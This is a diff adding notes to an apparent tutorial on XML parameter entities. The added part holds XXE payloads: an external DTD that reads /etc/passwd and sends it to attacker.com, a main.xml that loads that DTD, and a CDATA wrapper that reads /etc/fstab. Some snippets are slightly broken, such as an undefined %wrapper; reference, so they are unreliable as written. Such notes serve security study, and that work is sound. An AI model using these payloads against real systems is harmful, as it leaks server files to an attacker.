@@ -182,7 +182,49 @@ To use the parameter entity, you need to declare an additional general entity:
 
 * Here, `myGreeting` is a general entity that uses the value of the parameter entity `%greeting`.
 
+<!DOCTYPE test [
+<!ENTITY % parameter_entity "<!ENTITY general_entity 'pwnfunction'>">
+%parameter_entity;
+]>
 
+<pwn>&general_entity;</pwn>
+
+
+
+Parameter entity reference must not occur with in markup declarations, this doesn't apply to external parameter entity or dtd  
+
+```
+ <!ENTITY % ent "<!ENTITY send SYSTEM 'http://attacker.com/?%test;'>">
+
+```
+
+
+##### evil.dtd
+
+```
+<!ENTITY % test SYSTEM "file://etc/passwd">
+<!ENTITY % ent "<!ENTITY send SYSTEM 'http://attacker.com/?%test;'>">
+%wrapper;
+
+```
+
+##### main.xml
+```
+<!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd">
+<data>&send;</data>
+```
+
+##### CDATA
+
+EXternal entity
+
+```
+<!ENTITY % file SYSTEM "file:///etc/fstab">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % wrapper "<!ENTITY ALL '%start;%file;%end;'>">
+%wrapper;
+```
 
 
 #### 2. Including an External DTD Using Parameter Entities
